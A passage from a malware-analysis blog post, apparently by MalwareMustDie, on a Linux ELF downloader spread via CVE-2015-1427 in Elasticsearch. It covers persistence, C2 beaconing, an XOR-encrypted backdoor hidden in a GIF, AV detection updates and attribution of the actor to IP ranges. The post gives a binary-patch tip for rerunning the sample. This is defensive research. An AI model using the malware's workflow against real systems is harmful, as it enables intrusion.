downloader is self checking its version after installed first time by comparing the value stored in the infected machine:\u003Cbr\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-Q_rIvgTa86g\/VYwZjijuInI\/AAAAAAAASKg\/x-37JiAYw1c\/s1800\/1002.png\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-Q_rIvgTa86g\/VYwZjijuInI\/AAAAAAAASKg\/x-37JiAYw1c\/s580\/1002.png\u003E\u003C\/a\u003E\u003Cbr\u003ETo the fellow researchers and malware reversers (only!): The malware is designed to run only one time, to run it again is not that difficult, and I suggest to do what I did, patching the malware ELF binary in \u003Cb\u003E0x0804a14b\u003C\/b\u003E to not comparing \u003Cb\u003EEDX\u003C\/b\u003E to \u003Cb\u003EEDI\u003C\/b\u003E (by changing the value \\39\\FA to whatever values you prefer) and that makes the malware can run as initial everytime you executed, since it won't compare the previous version :)   \u003Cp\u003EFurther, the kernel dumped syscall shown during the condition of \u003Cb\u003EEDX =  EDI\u003C\/b\u003E shows some breakpoints that can be used for more analysis:\u003Cbr\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-kzmj1C2styg\/VYw9QOv9F7I\/AAAAAAAASMs\/Nn5ZVajiz6o\/s1912\/2005.png\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-kzmj1C2styg\/VYw9QOv9F7I\/AAAAAAAASMs\/Nn5ZVajiz6o\/s580\/2005.png\u003E\u003C\/a\u003E \u003Cp\u003EAnd also a botnet client\/agent. The user agent and HTTP method used for requesting remote host with the hostname basis encoded in the binary:\u003Cbr\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-FLYyYvdYVz8\/VYwZjiwMfKI\/AAAAAAAASKs\/uu5aQ6eZn9g\/s1800\/1003.png\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-FLYyYvdYVz8\/VYwZjiwMfKI\/AAAAAAAASKs\/uu5aQ6eZn9g\/s580\/1003.png\u003E\u003C\/a\u003E \u003Cp\u003EThe attempt to make autorun in the crontab:\u003Cbr\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-mn7HXTLnflQ\/VYwdZvhP05I\/AAAAAAAASK4\/tLv6sXzVkVg\/s1912\/1004.png\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-mn7HXTLnflQ\/VYwdZvhP05I\/AAAAAAAASK4\/tLv6sXzVkVg\/s580\/1004.png\u003E\u003C\/a\u003E \u003Cp\u003EAnd many more interesting data..  \u003Cp\u003E\u003Ch2\u003EHow does it run?\u003C\/h2\u003E \u003Cp\u003EUpon executed the malware will run under one PID as per shown in illustration below:\u003Cbr\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-37U6ZEWt2No\/VYwh6QnYLgI\/AAAAAAAASLE\/4p0h8kJ9LQQ\/s1912\/1005.png\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-37U6ZEWt2No\/VYwh6QnYLgI\/AAAAAAAASLE\/4p0h8kJ9LQQ\/s580\/1005.png\u003E \u003C\/a\u003E \u003Cp\u003EThen as a botnet nodes it started to poke the CNC by sending the below initial HTTP request:\u003Cbr\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-nvHQD8TQ1nM\/VYwjFUYkyRI\/AAAAAAAASLQ\/xjpEjQj2P0Q\/s1912\/1006.png\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-nvHQD8TQ1nM\/VYwjFUYkyRI\/AAAAAAAASLQ\/xjpEjQj2P0Q\/s580\/1006.png\u003E\u003C\/a\u003E \u003Cp\u003EFollowing by the second request that is getting the response of the \"GIF image file\" download:\u003Cbr\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-bz-Sn2OUVfs\/VYwkJ5uhOdI\/AAAAAAAASLY\/NjU0Y3IZGcs\/s1700\/1007.png\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-bz-Sn2OUVfs\/VYwkJ5uhOdI\/AAAAAAAASLY\/NjU0Y3IZGcs\/s580\/1007.png\u003E\u003C\/a\u003E\u003Cbr\u003Ethis is the image...\u003Cbr\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-iUpIwLnDAH4\/VYwny3oQn6I\/AAAAAAAASLk\/ZXvBwFpvulg\/s1912\/005.png\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-iUpIwLnDAH4\/VYwny3oQn6I\/AAAAAAAASLk\/ZXvBwFpvulg\/s580\/005.png\u003E\u003C\/a\u003E\u003Cbr\u003E..this is the detail of that GIF:\u003Cbr\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-NdwuBp7u0TY\/VYwo_I-354I\/AAAAAAAASLw\/-GDF69p6e6M\/s7113\/1008.png\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-NdwuBp7u0TY\/VYwo_I-354I\/AAAAAAAASLw\/-GDF69p6e6M\/s400\/1008.png\u003E\u003C\/a\u003E\u003Cbr\u003ELooks weird since the fact that GIF terminator 0x3b at offset 807(dec), 5497 bytes from end of file, meaning we have 5k of unknown data in there. \u003Cbr\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-3-2c1o2sGow\/VYxH3V2KI1I\/AAAAAAAASNY\/JtCC8LAAQ7I\/s1512\/1009.png\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-3-2c1o2sGow\/VYxH3V2KI1I\/AAAAAAAASNY\/JtCC8LAAQ7I\/s580\/1009.png\u003E\u003C\/a\u003E \u003Cp\u003EAfter the initial and GIF downloaded we have the same shell script saved in the malware working directory with the size more or less the same (5,726 bytes) as the unknown blob of data. There is a theory that have not been proved yet about this: So assuming the theory of DES encryption that stated: \u003Ci\u003E\"Using (xx)DES does not change the string's length but it will be rounded to the next (xx bit)boundary\"\u003C\/i\u003E is correct, and we are all know that XOR decryption is not changing the size of the object too, we can assume that what was in the GIF unknown blob is the encrypted malware shell script version itself. NOTED: This part is to be edited upon proven later on (see the next part)  \u003Cp\u003EPost-downloading the GIF data, botnet traffic requested by the malware are replied by the HTTP response 204, and constantly looping to request the same request to the motherhost: \u003Cbr\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-y0rWXOsLfI8\/VYw0Gfp3OaI\/AAAAAAAASMA\/AHmQeDku0SY\/s1912\/2001.png\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-y0rWXOsLfI8\/VYw0Gfp3OaI\/AAAAAAAASMA\/AHmQeDku0SY\/s580\/2001.png\u003E\u003C\/a\u003E \u003Cp\u003EThe overall initial three request in PCAP:\u003Cbr\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-8Lmzh_HgtvU\/VYw2JOx5S6I\/AAAAAAAASMM\/k6cvPEHlteI\/s1720\/2002.png\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-8Lmzh_HgtvU\/VYw2JOx5S6I\/AAAAAAAASMM\/k6cvPEHlteI\/s580\/2002.png\u003E\u003C\/a\u003E \u003Cp\u003EThe next communication is an HTTPS, which is a sign that the shell script was executed via wget or curl with the HTTPS connection to the remote host. as per stated in the shell script section.\u003Cbr\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-uyykGNwmBQk\/VYw2tClth-I\/AAAAAAAASMU\/K1wDC9p_nTo\/s1800\/2003.png\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-uyykGNwmBQk\/VYw2tClth-I\/AAAAAAAASMU\/K1wDC9p_nTo\/s580\/2003.png\u003E\u003C\/a\u003E \u003Cp\u003ETo PoC the downloaded file (script) was executed, I also seek for the kernel write syscall requesting for writing or copy the file as per described in above shell script. Be noted that during the ELF malware is executed there is no companion script was installed\/placed in there. ..And I found the list of the system calls querying the list of files in the shell script and these data is not even hard coded in the ELF binary itself, this those calls were made under the various new PID that can be occurred after shell execution:\u003Cbr\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-nWW_c5epUzo\/VYw6ye-3liI\/AAAAAAAASMg\/UFAfYIBIZu8\/s580\/2004.png\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-nWW_c5epUzo\/VYw6ye-3liI\/AAAAAAAASMg\/UFAfYIBIZu8\/s580\/2004.png\u003E\u003C\/a\u003E \u003Cp\u003EAfter advisory communication with good friends in Emerging Threat [\u003Ca href=\"http:\/\/www.emergingthreats.net\/\"\u003Elink tributed\u003C\/a\u003E] (thank to Will, Darien \u0026 Travis). we went back to the main() function in the ELF to confirm a XOR decryption loop used to decrypt the 5k blob of unknown binary in the downloaded GIF file, following by the writing the decrypted data to the new file, change the mode of file to the execution mode, as per shown in the below reversed code:\u003Cbr\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-PiHBJrGwlIE\/VYyoL-giZ1I\/AAAAAAAASNs\/Ka2kLIVqIwk\/s1800\/3001.png\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-PiHBJrGwlIE\/VYyoL-giZ1I\/AAAAAAAASNs\/Ka2kLIVqIwk\/s580\/3001.png\u003E\u003C\/a\u003E \u003Cp\u003EThe saved file to be then be prepared to be forked executed by the ELF (with some error trapping..just don't mind those..see the bottom part) as per details reversing data below:\u003Cbr\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-EI_rADfr7bM\/VYyoMP3vTWI\/AAAAAAAASNw\/q8HvDfIO4Jg\/s1720\/3002.png\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-EI_rADfr7bM\/VYyoMP3vTWI\/AAAAAAAASNw\/q8HvDfIO4Jg\/s580\/3002.png\u003E\u003C\/a\u003E \u003Cp\u003EThe XOR decrypted data is proven as the shell script backdoor malware described in the first part of the analysis, and thank you for the XOR decrypter script contributed by good friends in Emerging Threat [\u003Ca href=\"http:\/\/www.emergingthreats.net\/\"\u003Elink tributed\u003C\/a\u003E]! The PoC of the decrypting process can be seen in the below video.\u003Cbr\u003E\u003Ciframe width=\"580\" height=\"326\" src=\"https:\/\/www.youtube.com\/embed\/6yQJDu7eapg?rel=0\u0026amp;showinfo=0\" frameborder=\"0\" allowfullscreen\u003E\u003C\/iframe\u003E \u003Cp\u003E\u003Ch2\u003EDetection ratio and sample\u003C\/h2\u003E \u003Cp\u003EThe detection ratio of the ELF malware one is zero:\u003Cbr\u003E\u003Ca href=\"https:\/\/www.virustotal.com\/en\/file\/2b227c6bc9195350e683e1608959fc179a4efd9eb486f6ad65b2fa4e0552b55e\/analysis\/1435255038\/\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-uYbeNlavRCo\/VYxC1mgqSTI\/AAAAAAAASM8\/ohQP0V2P33w\/s580\/2006.png\u003E\u003C\/a\u003E \u003Cp\u003EThe detection ratio of the Shell Script backdoor is also zero:\u003Cbr\u003E\u003Ca href=\"https:\/\/www.virustotal.com\/en\/file\/55b67e05e01ee2e73074aaf2d010dbfea12d1e732365d2ad143fe818eeaf0c1c\/analysis\/1435255748\/\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-oCc7Psl0sxA\/VYxFTsD7rAI\/AAAAAAAASNI\/6YyfxPUgGp8\/s580\/2007.png\u003E\u003C\/a\u003E \u003Cp\u003EThe detection ratio of the GIF data contains the 5kB of XOR decrypted malware code is also zero:\u003Cbr\u003E\u003Ca href=\"https:\/\/www.virustotal.com\/en\/file\/32fd3215e5fc1edb77471e333b82602bb4b4160dda6503e5232950d2cab851bd\/analysis\/1435316030\/\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-RqwvKCHi9ww\/VY00x5xO3nI\/AAAAAAAASOQ\/Vrfqsqd6ZTs\/s580\/3006.png\u003E\u003C\/a\u003E \u003Cp\u003EEmerging Threat was urgently releasing IDS filtration in a couple hours after I reported this threat, GREAT action!\u003Cbr\u003E\u003Ca href=\"http:\/\/www.emergingthreats.net\/products\/etpro-ruleset\/daily-ruleset-update-summary\/daily-ruleset-update-summary-2015\/06\/25\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-dg9h7O0VXwQ\/VY0389shqlI\/AAAAAAAASOc\/PdXD9aqOJKw\/s580\/3007.png\u003E\u003C\/a\u003E \u003Cp\u003EThe sample is shared in the kernelmode only--\u003E[\u003Ca href=\"http:\/\/www.kernelmode.info\/forum\/viewtopic.php?f=16\u0026t=3923\u0026p=26185#p26185\"\u003ELINK\u003C\/a\u003E]  \u003Cp\u003E\u003Ch2\u003EActor initial investigation\u003C\/h2\u003E \u003Cp\u003ECertification and web trails of the actor exists in the internet, in example:\u003Cbr\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-DKhSAbBj7sI\/VY5YJ5LW7cI\/AAAAAAAASO0\/B8-ez4yoHTs\/s1912\/001.png\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-DKhSAbBj7sI\/VY5YJ5LW7cI\/AAAAAAAASO0\/B8-ez4yoHTs\/s580\/001.png\u003E\u003C\/a\u003E\u003Cbr\u003E..and.. \u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-5_T92DSsuIY\/VY5YJ9zNeCI\/AAAAAAAASOw\/v0KIzVJyzjY\/s1912\/002.png\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-5_T92DSsuIY\/VY5YJ9zNeCI\/AAAAAAAASOw\/v0KIzVJyzjY\/s580\/002.png\u003E\u003C\/a\u003E\u003Cbr\u003EThe information above lead us to the location of the actor which was in the below network under a certain time frame: \u003Cpre class=\"brush: asm\"\u003E222.208.0.0\/13 \u003Cbr \/\u003E123.144.0.0\/14 AS4837 \u003C\/pre\u003EWe believe he \"was\" living in the area as per shown in below video. More data to be shared to the law enforcement only.\u003Cbr\u003E\u003Ciframe width=\"580\" height=\"435\" src=\"https:\/\/www.youtube.com\/embed\/7nCPHEnhzqo?rel=0\u0026amp;controls=0\u0026amp;showinfo=0\" frameborder=\"0\" allowfullscreen\u003E\u003C\/iframe\u003E \u003Cp\u003E\u003Ch2\u003EFeedback from security community (tweets)\u003C\/h2\u003E \u003Cp\u003E\u003Cblockquote class=\"twitter-tweet\" data-conversation=\"none\" lang=\"ja\"\u003E\u003Cp lang=\"en\" dir=\"ltr\"\u003E\u003Ca href=\"https:\/\/twitter.com\/MalwareMustDie\"\u003E@MalwareMustDie\u003C\/a\u003E \u003Ca href=\"https:\/\/twitter.com\/unixfreaxjp\"\u003E@unixfreaxjp\u003C\/a\u003E \u003Ca href=\"https:\/\/twitter.com\/hFireF0X\"\u003E@hFireF0X\u003C\/a\u003E \u003Ca href=\"https:\/\/twitter.com\/Xylit0l\"\u003E@Xylit0l\u003C\/a\u003E \u003Ca href=\"https:\/\/twitter.com\/virustotal\"\u003E@virustotal\u003C\/a\u003E it can be actually rooted in two ways: kernel\/app sploit; user sudoers. 1,5-2%\u003C\/p\u003E\u0026mdash; Infosec Machete (@itsec_machete) \u003Ca href=\"https:\/\/twitter.com\/itsec_machete\/status\/614166013081468929\"\u003E2015, 6月 25\u003C\/a\u003E\u003C\/blockquote\u003E\u003Cscript async src=\"\/\/platform.twitter.com\/widgets.js\" charset=\"utf-8\"\u003E\u003C\/script\u003E \u003Cblockquote class=\"twitter-tweet\" data-conversation=\"none\" lang=\"ja\"\u003E\u003Cp lang=\"en\" dir=\"ltr\"\u003E\u003Ca href=\"https:\/\/twitter.com\/MalwareMustDie\"\u003E@MalwareMustDie\u003C\/a\u003E \u003Ca href=\"https:\/\/twitter.com\/itsec_machete\"\u003E@itsec_machete\u003C\/a\u003E \u003Ca href=\"https:\/\/twitter.com\/unixfreaxjp\"\u003E@unixfreaxjp\u003C\/a\u003E \u003Ca href=\"https:\/\/twitter.com\/hFireF0X\"\u003E@hFireF0X\u003C\/a\u003E \u003Ca href=\"https:\/\/twitter.com\/Xylit0l\"\u003E@Xylit0l\u003C\/a\u003E \u003Ca href=\"https:\/\/twitter.com\/virustotal\"\u003E@virustotal\u003C\/a\u003E didn\u0026#39;t expect my tool Lynis in these writeups :)\u003C\/p\u003E\u0026mdash; Michael Boelen (@mboelen) \u003Ca href=\"https:\/\/twitter.com\/mboelen\/status\/614366054802964480\"\u003E2015, 6月 26\u003C\/a\u003E\u003C\/blockquote\u003E\u003Cscript async src=\"\/\/platform.twitter.com\/widgets.js\" charset=\"utf-8\"\u003E\u003C\/script\u003E \u003Cblockquote class=\"twitter-tweet\" data-conversation=\"none\" lang=\"en\"\u003E\u003Cp lang=\"en\" dir=\"ltr\"\u003E\u003Ca href=\"https:\/\/twitter.com\/MalwareMustDie\"\u003E@MalwareMustDie\u003C\/a\u003E \u003Ca href=\"https:\/\/twitter.com\/unixfreaxjp\"\u003E@unixfreaxjp\u003C\/a\u003E omg \u003Ca href=\"https:\/\/twitter.com\/Elasticsearch\"\u003E@Elasticsearch\u003C\/a\u003E groovy\/Java code delivered into your engine over js is terrible stop it. Crazy.\u003C\/p\u003E\u0026mdash; Moses Hernandez (@mosesrenegade) \u003Ca href=\"https:\/\/twitter.com\/mosesrenegade\/status\/614248634427809792\"\u003EJune 26, 2015\u003C\/a\u003E\u003C\/blockquote\u003E\u003Cscript async src=\"\/\/platform.twitter.com\/widgets.js\" charset=\"utf-8\"\u003E\u003C\/script\u003E \u003Cblockquote class=\"twitter-tweet\" lang=\"en\"\u003E\u003Cp lang=\"en\" dir=\"ltr\"\u003E18h since alert of \u003Ca href=\"https:\/\/twitter.com\/hashtag\/Linux?src=hash\"\u003E#Linux\u003C\/a\u003E\/DES.Downloader \u003Ca href=\"https:\/\/twitter.com\/hashtag\/malware?src=hash\"\u003E#malware\u003C\/a\u003E\u0026#10;Still Fully UnDetected by AV.\u0026#10;BUT \u003Ca href=\"https:\/\/twitter.com\/EmergingThreats\"\u003E@EmergingThreats\u003C\/a\u003E IDS sig blocks!! \u003Ca href=\"http:\/\/t.co\/dXRoYaqZ69\"\u003Epic.twitter.com\/dXRoYaqZ69\u003C\/a\u003E\u003C\/p\u003E\u0026mdash; MalwareMustDie, NPO (@MalwareMustDie) \u003Ca href=\"https:\/\/twitter.com\/MalwareMustDie\/status\/614400392445624320\"\u003EJune 26, 2015\u003C\/a\u003E\u003C\/blockquote\u003E\u003Cscript async src=\"\/\/platform.twitter.com\/widgets.js\" charset=\"utf-8\"\u003E\u003C\/script\u003E \u003Ca name=\"ratio\"\u003E\u003Cp\u003E\u003Ch2\u003EAV-Test.org's helps to push rate of ELF AV detection ratio, below is the historical timeline for this ELF malware's detection:\u003C\/h2\u003E\u003C\/a\u003E \u003Cblockquote class=\"twitter-tweet\" lang=\"ja\"\u003E\u003Cp lang=\"en\" dir=\"ltr\"\u003EThe \u003Ca href=\"https:\/\/twitter.com\/MalwareMustDie\"\u003E@MalwareMustDie\u003C\/a\u003E team pointed us to \u003Ca href=\"https:\/\/twitter.com\/hashtag\/CVE?src=hash\"\u003E#CVE\u003C\/a\u003E-2015-1427. We can confirm that no AV is detecting the shared samples ATM. \u003Ca href=\"http:\/\/t.co\/IgSZbsgm8R\"\u003Ehttp:\/\/t.co\/IgSZbsgm8R\u003C\/a\u003E\u003C\/p\u003E\u0026mdash; AV-TEST GmbH (@avtestorg) \u003Ca href=\"https:\/\/twitter.com\/avtestorg\/status\/614420560878141440\"\u003E2015, 6月 26\u003C\/a\u003E\u003C\/blockquote\u003E\u003Cscript async src=\"\/\/platform.twitter.com\/widgets.js\" charset=\"utf-8\"\u003E\u003C\/script\u003E \u003Cblockquote class=\"twitter-tweet\" data-conversation=\"none\" lang=\"en\"\u003E\u003Cp lang=\"en\" dir=\"ltr\"\u003EUpdate: \u003Ca href=\"https:\/\/twitter.com\/ESET\"\u003E@ESET\u003C\/a\u003E Nod32 is now detecting the ELF binary and script as \u0026quot;Linux\/TrojanDownloader.Agent.D trojan\u0026quot;. \u003Ca href=\"https:\/\/twitter.com\/hashtag\/CVE?src=hash\"\u003E#CVE\u003C\/a\u003E-2015-1427 \u003Ca href=\"https:\/\/twitter.com\/MalwareMustDie\"\u003E@MalwareMustDie\u003C\/a\u003E\u003C\/p\u003E\u0026mdash; AV-TEST GmbH (@avtestorg) \u003Ca href=\"https:\/\/twitter.com\/avtestorg\/status\/614453500735549440\"\u003EJune 26, 2015\u003C\/a\u003E\u003C\/blockquote\u003E\u003Cscript async src=\"\/\/platform.twitter.com\/widgets.js\" charset=\"utf-8\"\u003E\u003C\/script\u003E \u003Cblockquote class=\"twitter-tweet\" data-conversation=\"none\" lang=\"en\"\u003E\u003Cp lang=\"en\" dir=\"ltr\"\u003EUpdate#2: \u003Ca href=\"https:\/\/twitter.com\/Avira\"\u003E@Avira\u003C\/a\u003E added detection as \u0026quot;EXP\/CVE-2015-1427.A\u0026quot; (ELF binary) and \u0026quot;SH\/Rogue.15626\u0026quot; (shell script) \u003Ca href=\"https:\/\/twitter.com\/hashtag\/CVE?src=hash\"\u003E#CVE\u003C\/a\u003E-2015-1427 \u003Ca href=\"https:\/\/twitter.com\/MalwareMustDie\"\u003E@MalwareMustDie\u003C\/a\u003E\u003C\/p\u003E\u0026mdash; AV-TEST GmbH (@avtestorg) \u003Ca href=\"https:\/\/twitter.com\/avtestorg\/status\/614503623989571584\"\u003EJune 26, 2015\u003C\/a\u003E\u003C\/blockquote\u003E\u003Cscript async src=\"\/\/platform.twitter.com\/widgets.js\" charset=\"utf-8\"\u003E\u003C\/script\u003E \u003Cblockquote class=\"twitter-tweet\" data-conversation=\"none\" lang=\"en\"\u003E\u003Cp lang=\"en\" dir=\"ltr\"\u003EUpdate#3: ... and \u003Ca href=\"https:\/\/twitter.com\/avast_antivirus\"\u003E@avast_antivirus\u003C\/a\u003E is the first AV which takes care of the GIF as \u0026quot;Other:Malware-gen [Trj]\u0026quot; \u003Ca href=\"https:\/\/twitter.com\/hashtag\/CVE?src=hash\"\u003E#CVE\u003C\/a\u003E-2015-1427 \u003Ca href=\"https:\/\/twitter.com\/MalwareMustDie\"\u003E@MalwareMustDie\u003C\/a\u003E\u003C\/p\u003E\u0026mdash; AV-TEST GmbH (@avtestorg) \u003Ca href=\"https:\/\/twitter.com\/avtestorg\/status\/614504378804903936\"\u003EJune 26, 2015\u003C\/a\u003E\u003C\/blockquote\u003E\u003Cscript async src=\"\/\/platform.twitter.com\/widgets.js\" charset=\"utf-8\"\u003E\u003C\/script\u003E \u003Cblockquote class=\"twitter-tweet\" data-conversation=\"none\" lang=\"en\"\u003E\u003Cp lang=\"en\" dir=\"ltr\"\u003EUpdate#4: A surprising response: \u0026quot;The file you submitted is clean. It is not malicious. No detection needed.\u0026quot; \u003Ca href=\"https:\/\/twitter.com\/hashtag\/CVE?src=hash\"\u003E#CVE\u003C\/a\u003E-2015-1427 \u003Ca href=\"https:\/\/twitter.com\/MalwareMustDie\"\u003E@MalwareMustDie\u003C\/a\u003E\u003C\/p\u003E\u0026mdash; AV-TEST GmbH (@avtestorg) \u003Ca href=\"https:\/\/twitter.com\/avtestorg\/status\/614505546675306496\"\u003EJune 26, 2015\u003C\/a\u003E\u003C\/blockquote\u003E\u003Cscript async src=\"\/\/platform.twitter.com\/widgets.js\" charset=\"utf-8\"\u003E\u003C\/script\u003E \u003Cblockquote class=\"twitter-tweet\" data-conversation=\"none\" lang=\"en\"\u003E\u003Cp lang=\"en\" dir=\"ltr\"\u003ERegarding update#4: The vendor in question has updated the response and confirmed to detect the samples soon. \u003Ca href=\"https:\/\/twitter.com\/hashtag\/CVE?src=hash\"\u003E#CVE\u003C\/a\u003E-2015-1427 \u003Ca href=\"https:\/\/twitter.com\/MalwareMustDie\"\u003E@MalwareMustDie\u003C\/a\u003E\u003C\/p\u003E\u0026mdash; AV-TEST GmbH (@avtestorg) \u003Ca href=\"https:\/\/twitter.com\/avtestorg\/status\/614510825299124224\"\u003EJune 26, 2015\u003C\/a\u003E\u003C\/blockquote\u003E\u003Cscript async src=\"\/\/platform.twitter.com\/widgets.js\" charset=\"utf-8\"\u003E\u003C\/script\u003E \u003Cblockquote class=\"twitter-tweet\" data-conversation=\"none\" lang=\"ja\"\u003E\u003Cp lang=\"en\" dir=\"ltr\"\u003EToday\u0026#39;s final update: No further AV detections besides the ones mentioned by \u003Ca href=\"https:\/\/twitter.com\/ESET\"\u003E@ESET\u003C\/a\u003E, \u003Ca href=\"https:\/\/twitter.com\/Avira\"\u003E@Avira\u003C\/a\u003E \u0026amp; \u003Ca href=\"https:\/\/twitter.com\/avast_antivirus\"\u003E@avast_antivirus\u003C\/a\u003E \u003Ca href=\"https:\/\/twitter.com\/hashtag\/CVE?src=hash\"\u003E#CVE\u003C\/a\u003E-2015-1427 \u003Ca href=\"https:\/\/twitter.com\/MalwareMustDie\"\u003E@MalwareMustDie\u003C\/a\u003E\u003C\/p\u003E\u0026mdash; AV-TEST GmbH (@avtestorg) \u003Ca href=\"https:\/\/twitter.com\/avtestorg\/status\/614542725422153728\"\u003E2015, 6月 26\u003C\/a\u003E\u003C\/blockquote\u003E\u003Cscript async src=\"\/\/platform.twitter.com\/widgets.js\" charset=\"utf-8\"\u003E\u003C\/script\u003E \u003Cblockquote class=\"twitter-tweet\" data-conversation=\"none\" data-cards=\"hidden\" lang=\"ja\"\u003E\u003Cp lang=\"en\" dir=\"ltr\"\u003EUpdate #6: New AV detections by \u003Ca href=\"https:\/\/twitter.com\/Fortinet\"\u003E@Fortinet\u003C\/a\u003E and \u003Ca href=\"https:\/\/twitter.com\/kaspersky\"\u003E@kaspersky\u003C\/a\u003E are now in place. XREF below. \u003Ca href=\"https:\/\/twitter.com\/MalwareMustDie\"\u003E@MalwareMustDie\u003C\/a\u003E \u003Ca href=\"https:\/\/twitter.com\/hashtag\/CVE?src=hash\"\u003E#CVE\u003C\/a\u003E-2015-1427 \u003Ca href=\"http:\/\/t.co\/X8JKFer5jy\"\u003Epic.twitter.com\/X8JKFer5jy\u003C\/a\u003E\u003C\/p\u003E\u0026mdash; AV-TEST GmbH (@avtestorg) \u003Ca href=\"https:\/\/twitter.com\/avtestorg\/status\/614717855028932608\"\u003E2015, 6月 27\u003C\/a\u003E\u003C\/blockquote\u003E\u003Cscript async src=\"\/\/platform.twitter.com\/widgets.js\" charset=\"utf-8\"\u003E\u003C\/script\u003E \u003Cblockquote class=\"twitter-tweet\" data-conversation=\"none\" data-cards=\"hidden\" lang=\"en-gb\"\u003E\u003Cp lang=\"en\" dir=\"ltr\"\u003EUpdate #7: We\u0026#39;ve reviewed 39 AV products and the current detection names are... \u003Ca href=\"https:\/\/twitter.com\/MalwareMustDie\"\u003E@MalwareMustDie\u003C\/a\u003E \u003Ca href=\"https:\/\/twitter.com\/hashtag\/CVE?src=hash\"\u003E#CVE\u003C\/a\u003E-2015-1427 \u003Ca href=\"http:\/\/t.co\/cKiq3uiW0Q\"\u003Epic.twitter.com\/cKiq3uiW0Q\u003C\/a\u003E\u003C\/p\u003E\u0026mdash; AV-TEST GmbH (@avtestorg) \u003Ca href=\"https:\/\/twitter.com\/avtestorg\/status\/614912573260079106\"\u003EJune 27, 2015\u003C\/a\u003E\u003C\/blockquote\u003E\u003Cscript async src=\"\/\/platform.twitter.com\/widgets.js\" charset=\"utf-8\"\u003E\u003C\/script\u003E \u003Cblockquote class=\"twitter-tweet\" data-conversation=\"none\" data-cards=\"hidden\" lang=\"en\"\u003E\u003Cp lang=\"en\" dir=\"ltr\"\u003EUpdate #8: The first AV with full detection is \u003Ca href=\"https:\/\/twitter.com\/avast_antivirus\"\u003E@avast_antivirus\u003C\/a\u003E - see below. \u003Ca href=\"https:\/\/twitter.com\/MalwareMustDie\"\u003E@MalwareMustDie\u003C\/a\u003E \u003Ca href=\"https:\/\/twitter.com\/hashtag\/CVE?src=hash\"\u003E#CVE\u003C\/a\u003E-2015-1427 \u003Ca href=\"http:\/\/t.co\/YQlTVWcT5M\"\u003Epic.twitter.com\/YQlTVWcT5M\u003C\/a\u003E\u003C\/p\u003E\u0026mdash; AV-TEST GmbH (@avtestorg) \u003Ca href=\"https:\/\/twitter.com\/avtestorg\/status\/615053857723387904\"\u003EJune 28, 2015\u003C\/a\u003E\u003C\/blockquote\u003E\u003Cscript async src=\"\/\/platform.twitter.com\/widgets.js\" charset=\"utf-8\"\u003E\u003C\/script\u003E \u003Cblockquote class=\"twitter-tweet\" data-conversation=\"none\" data-cards=\"hidden\" lang=\"en\"\u003E\u003Cp lang=\"en\" dir=\"ltr\"\u003EUpdate #9... is not really an update, as we cannot report any AV detection change. \u003Ca href=\"https:\/\/twitter.com\/MalwareMustDie\"\u003E@MalwareMustDie\u003C\/a\u003E \u003Ca href=\"https:\/\/twitter.com\/hashtag\/CVE?src=hash\"\u003E#CVE\u003C\/a\u003E-2015-1427 \u003Ca href=\"http:\/\/t.co\/bWi17nEuL1\"\u003Epic.twitter.com\/bWi17nEuL1\u003C\/a\u003E\u003C\/p\u003E\u0026mdash; AV-TEST GmbH (@avtestorg) \u003Ca href=\"https:\/\/twitter.com\/avtestorg\/status\/615249336264454144\"\u003EJune 28, 2015\u003C\/a\u003E\u003C\/blockquote\u003E\u003Cscript async src=\"\/\/platform.twitter.com\/widgets.js\" charset=\"utf-8\"\u003E\u003C\/script\u003E \u003Cblockquote class=\"twitter-tweet\" data-conversation=\"none\" data-cards=\"hidden\" lang=\"en\"\u003E\u003Cp lang=\"en\" dir=\"ltr\"\u003EUpdate #10: AV detections by \u003Ca href=\"https:\/\/twitter.com\/CYRENInc\"\u003E@CYRENInc\u003C\/a\u003E (full) and \u003Ca href=\"https:\/\/twitter.com\/symantec\"\u003E@symantec\u003C\/a\u003E (partial) are available. \u003Ca href=\"https:\/\/twitter.com\/MalwareMustDie\"\u003E@MalwareMustDie\u003C\/a\u003E \u003Ca 